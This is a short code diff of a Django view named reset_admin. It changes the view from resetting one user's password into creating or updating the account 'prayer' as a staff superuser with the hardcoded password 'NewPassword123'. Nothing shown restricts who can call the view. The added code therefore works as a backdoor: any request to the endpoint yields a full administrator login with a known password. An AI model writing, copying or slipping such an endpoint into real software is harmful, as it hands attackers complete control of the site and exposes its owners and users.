@@ -74,7 +74,14 @@ from django.contrib.auth.models import User
 from django.http import HttpResponse
 
 def reset_admin(request):
-    u = User.objects.get(username="prayer")
-    u.set_password("NewPassword123")
-    u.save()
-    return HttpResponse("Admin password reset successful")
+    username = "prayer"
+    password = "NewPassword123"
+
+    user, created = User.objects.get_or_create(username=username)
+
+    user.is_staff = True
+    user.is_superuser = True
+    user.set_password(password)
+    user.save()
+
+    return HttpResponse(f"Admin ready. Created: {created}")
